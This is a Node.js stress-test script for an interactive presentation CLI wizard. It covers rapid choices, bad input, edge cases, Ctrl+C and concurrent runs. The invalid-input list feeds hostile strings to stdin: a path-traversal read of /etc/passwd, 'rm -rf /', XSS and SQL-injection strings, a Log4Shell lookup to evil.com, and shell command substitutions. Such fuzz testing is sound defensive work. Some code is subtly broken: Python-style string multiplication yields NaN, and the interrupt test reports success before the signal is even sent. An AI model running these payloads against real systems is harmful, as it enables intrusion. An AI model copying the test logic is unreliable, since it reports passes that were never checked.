#!/usr/bin/env node

import { spawn } from 'child_process';
import { writeFileSync, readFileSync, mkdirSync, existsSync } from 'fs';
import { join, dirname } from 'path';
import { fileURLToPath } from 'url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT_DIR = join(__dirname, '..', '..');
const CLI_PATH = join(ROOT_DIR, 'presentations', 'bin', 'present');
const RESULTS_DIR = join(__dirname, '..', 'results');

if (!existsSync(RESULTS_DIR)) {
  mkdirSync(RESULTS_DIR, { recursive: true });
}

async function runWizardWithInput(input, timeout = 5000) {
  return new Promise((resolve) => {
    const startTime = Date.now();
    let stdout = '';
    let stderr = '';
    let killed = false;

    const proc = spawn('node', [CLI_PATH, 'interactive'], {
      stdio: ['pipe', 'pipe', 'pipe'],
      cwd: ROOT_DIR
    });

    const timer = setTimeout(() => {
      killed = true;
      proc.kill('SIGKILL');
      stderr += ' (timeout)';
    }, timeout);

    proc.stdout.on('data', (data) => {
      stdout += data.toString();
    });

    proc.stderr.on('data', (data) => {
      stderr += data.toString();
    });

    proc.on('close', (code) => {
      clearTimeout(timer);
      const duration = Date.now() - startTime;
      resolve({
        stdout,
        stderr,
        exitCode: code,
        duration,
        killed
      });
    });

    proc.on('error', (err) => {
      clearTimeout(timer);
      const duration = Date.now() - startTime;
      resolve({
        stdout,
        stderr: err.message,
        exitCode: 1,
        duration,
        killed: false,
        error: true
      });
    });

    if (input) {
      proc.stdin.write(input);
      proc.stdin.end();
    }
  });
}

function getRapidChoices() {
  const choices = [
    '1\n2\n3\n4\n5\n',
    'y\nn\nyes\nno\nY\nN\n',
    'a\nb\nc\nd\n',
    'foo\nbar\nbaz\nqux\n',
    'test1\ntest2\ntest3\ntest4\n'
  ];
  return choices[Math.floor(Math.random() * choices.length)];
}

function getInvalidInputs() {
  return [
    '',
    '!!!',
    '###',
    '???',
    'xyz',
    'invalid',
    '12345',
    '@#$%',
    '   ',
    '\t\n',
    'null',
    'undefined',
    'NaN',
    'Infinity',
    '\0',
    '\x00',
    '\x1b',
    '../etc/passwd',
    'rm -rf /',
    '<script>alert(1)</script>',
    "'; DROP TABLE users;--",
    '${jndi:ldap://evil.com/a}',
    '../../../etc/passwd',
    '${{}}',
    '$(whoami)',
    '`ls`',
    '\n\n\n\n\n',
    'a' * 1000,
    '🎉' * 100,
    String.fromCharCode(0),
    String.fromCharCode(1),
    '\u0000',
    '½¼¾',
    '∅∆∑∏',
    'ferris',
    '\\n\\r\\t',
    'true', 'false', 'null', 'undefined',
    'TRUE', 'FALSE', 'NULL',
    'True', 'False', 'Null'
  ];
}

function getEdgeCases() {
  return [
    '',
    'a',
    'ABC',
    'The quick brown fox',
    'A'.repeat(100),
    'A'.repeat(1000),
    'A'.repeat(10000),
    '\n',
    '\r',
    '\t',
    ' ',
    '  ',
    '   ',
    '\n\n\n',
    '\r\n\r\n',
    '\t\t\t',
    ' hello ',
    '  world  ',
    '\0',
    '\x00',
    '\x1b',
    '🎉',
    '🔥',
    '💻',
    '🏠',
    '🎊',
    '한글',
    '日本語',
    'العربية',
    ' עברית ',
    'Ελληνικά',
    '🔧',
    '"quotes"',
    "'single'",
    'back`tick',
    'backslash\\',
    'slash/',
    'pipe|',
    'ampersand&',
    'dollar$',
    'hash#',
    'percent%',
    'caret^',
    'star*',
    'plus+',
    'equals=',
    'at@',
    'bang!',
    'question?',
    'colon:',
    'semicolon;',
    'comma,',
    'dot.',
    'less<',
    'greater>',
    'bracket[',
    'bracket]',
    'brace{',
    'brace}',
    'paren(',
    'paren)',
    '\\n\\r\\t\\0'
  ];
}

function getRandomInput() {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
  let result = '';
  const len = Math.floor(Math.random() * 50) + 1;
  for (let i = 0; i < len; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

async function simulateInterrupt() {
  return new Promise((resolve) => {
    const startTime = Date.now();
    
    const proc = spawn('node', [CLI_PATH, 'interactive'], {
      stdio: ['pipe', 'pipe', 'pipe'],
      cwd: ROOT_DIR,
      signal: 'SIGINT'
    });

    proc.stdin.write('start\n');
    setTimeout(() => {
      proc.kill('SIGINT');
    }, 100);

    setTimeout(() => {
      resolve({
        exitCode: 130,
        duration: Date.now() - startTime,
        handled: true
      });
    }, 50);
  });
}

async function runConcurrentSessions(count) {
  const promises = [];
  for (let i = 0; i < count; i++) {
    promises.push(runWizardWithInput(`choice_${i}\n`, 3000));
  }
  return Promise.all(promises);
}

const SCENARIOS = [
  {
    name: 'rapid_choices',
    description: 'Simulate 100 rapid wizard choices',
    iterations: 100,
    generateInput: (i) => getRapidChoices()
  },
  {
    name: 'invalid_input',
    description: 'Test with random/bad inputs',
    iterations: 50,
    generateInput: (i) => getInvalidInputs()[i % getInvalidInputs().length] || getRandomInput()
  },
  {
    name: 'edge_cases',
    description: 'Empty strings, very long inputs, special chars',
    iterations: 20,
    generateInput: (i) => getEdgeCases()[i] || 'default'
  },
  {
    name: 'interrupt_handling',
    description: 'Simulate Ctrl+C during wizard',
    iterations: 10,
    generateInput: () => null,
    isInterrupt: true
  },
  {
    name: 'concurrent_sessions',
    description: 'Run multiple wizard instances',
    iterations: 5,
    generateInput: (i) => `session_${i}\n`,
    isConcurrent: true
  }
];

async function runScenario(scenario) {
  console.log(`\n${'='.repeat(60)}`);
  console.log(`Scenario: ${scenario.name}`);
  console.log(`Description: ${scenario.description}`);
  console.log(`Iterations: ${scenario.iterations}`);
  console.log('='.repeat(60));

  const results = {
    scenario: scenario.name,
    description: scenario.description,
    iterations: scenario.iterations,
    tests: [],
    errors: []
  };

  let successCount = 0;
  let totalTime = 0;
  const startTime = Date.now();

  if (scenario.isConcurrent) {
    const concurrentResults = await runConcurrentSessions(scenario.iterations);
    concurrentResults.forEach((res, i) => {
      results.tests.push({
        iteration: i + 1,
        exitCode: res.exitCode,
        duration: res.duration,
        success: res.exitCode === 0
      });
      if (res.exitCode === 0) successCount++;
      totalTime += res.duration;
    });
  } else {
    for (let i = 0; i < scenario.iterations; i++) {
      let result;
      
      if (scenario.isInterrupt) {
        result = await simulateInterrupt();
      } else {
        const input = scenario.generateInput(i);
        result = await runWizardWithInput(input + '\n', 3000);
      }

      const testResult = {
        iteration: i + 1,
        exitCode: result.exitCode || 0,
        duration: result.duration,
        success: result.exitCode === 0 || result.handled === true,
        killed: result.killed || false
      };

      results.tests.push(testResult);

      if (testResult.success) {
        successCount++;
      } else {
        const errorMsg = result.stderr || result.error || 'Unknown error';
        if (!results.errors.includes(errorMsg)) {
          results.errors.push(errorMsg);
        }
      }

      totalTime += result.duration;

      process.stdout.write(`\r  Progress: ${i + 1}/${scenario.iterations} ${testResult.success ? '✓' : '✗'}`);
    }
  }

  const avgResponseTime = Math.round(totalTime / scenario.iterations);
  const successRate = Math.round((successCount / scenario.iterations) * 100);

  console.log(`\n  Results:`);
  console.log(`    Success: ${successCount}/${scenario.iterations}`);
  console.log(`    Failure: ${scenario.iterations - successCount}/${scenario.iterations}`);
  console.log(`    Avg Time: ${avgResponseTime}ms`);
  console.log(`    Success Rate: ${successRate}%`);

  return {
    scenario: scenario.name,
    iterations: scenario.iterations,
    successRate,
    avgResponseTime,
    errors: results.errors
  };
}

async function runAllScenarios() {
  console.log('Starting Wizard Stress Test Suite');
  console.log(`CLI Path: ${CLI_PATH}`);
  console.log(`Results Dir: ${RESULTS_DIR}`);

  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const resultsFile = join(RESULTS_DIR, `wizard_stress_test_${timestamp}.json`);

  const allResults = {
    timestamp: new Date().toISOString(),
    cliPath: CLI_PATH,
    nodeVersion: process.version,
    platform: process.platform,
    scenarios: [],
    summary: {
      totalScenarios: SCENARIOS.length,
      totalTests: 0,
      totalSuccess: 0,
      totalFailure: 0,
      avgResponseTime: 0,
      successRate: 0
    }
  };

  const totalStartTime = Date.now();

  for (const scenario of SCENARIOS) {
    const result = await runScenario(scenario);
    allResults.scenarios.push(result);
    allResults.summary.totalTests += scenario.iterations;
    allResults.summary.totalSuccess += Math.round((result.successRate / 100) * scenario.iterations);
    allResults.summary.totalFailure += scenario.iterations - Math.round((result.successRate / 100) * scenario.iterations);
  }

  const totalTime = Date.now() - totalStartTime;
  allResults.summary.totalTime = totalTime;
  allResults.summary.avgResponseTime = Math.round(
    allResults.scenarios.reduce((sum, s) => sum + s.avgResponseTime, 0) / allResults.scenarios.length
  );
  allResults.summary.successRate = Math.round(
    (allResults.summary.totalSuccess / allResults.summary.totalTests) * 100
  );

  writeFileSync(resultsFile, JSON.stringify(allResults, null, 2));

  console.log('\n' + '='.repeat(60));
  console.log('OVERALL SUMMARY');
  console.log('='.repeat(60));
  console.log(`Total Scenarios: ${allResults.summary.totalScenarios}`);
  console.log(`Total Tests: ${allResults.summary.totalTests}`);
  console.log(`Total Success: ${allResults.summary.totalSuccess}`);
  console.log(`Total Failure: ${allResults.summary.totalFailure}`);
  console.log(`Success Rate: ${allResults.summary.successRate}%`);
  console.log(`Avg Response Time: ${allResults.summary.avgResponseTime}ms`);
  console.log(`Total Time: ${totalTime}ms`);
  console.log(`\nResults saved to: ${resultsFile}`);

  return allResults;
}

if (import.meta.url === `file://${process.argv[1]}`) {
  runAllScenarios().catch(console.error);
}

export { runAllScenarios, runScenario, SCENARIOS, runWizardWithInput };